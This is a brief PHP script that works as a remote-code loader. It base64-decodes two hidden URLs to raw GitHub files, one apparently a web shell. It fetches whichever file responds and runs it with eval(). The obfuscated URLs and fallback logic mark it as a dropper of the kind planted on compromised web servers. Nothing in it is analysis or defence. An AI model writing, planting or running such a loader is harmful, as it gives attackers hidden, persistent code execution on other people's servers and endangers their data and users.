<?php
$x = '?>';
$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4ZWN1dGl2ZW11ZGEvdXBsb2FkbmV3L21haW4vbmV3L21haW4vc2VsbC5waHA');
$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4ZWN1dGl2ZW11ZGEvc2VrYXJhL21haW4vY29kZS9tYWluL3dzL3dzLnR4dA');

$script1 = get($url1);
if ($script1 !== false && $script1 !== 404) {
    eval($x . $script1);
} else {
    $script2 = get($url2);
    if ($script2 !== false) {
        eval($x . $script2);
    } else {
        echo "Both attempts failed.";
    }
}
